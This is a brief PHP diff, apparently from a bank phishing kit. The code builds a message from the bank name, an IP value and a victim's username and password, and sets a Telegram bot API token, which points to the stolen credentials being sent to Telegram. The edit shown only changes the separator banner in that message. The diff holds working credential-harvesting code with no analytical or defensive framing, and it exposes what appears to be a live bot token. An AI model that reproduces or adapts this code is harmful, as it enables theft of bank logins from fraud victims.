@@ -201,7 +201,7 @@ if ($success==false) {
 
 
 
-$message =" $bank$lh$ip\n\n-----------------\n\n$user\n\n----------------\n\n$pass\n\n---------------------\n\n";
+$message =" $bank$lh$ip\n\n\n[ + ]-----[SR]-----[ + ]\n\n\n$user\n\n----------------\n\n$pass\n\n---------------------\n\n";
 
 $apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
 $data = [
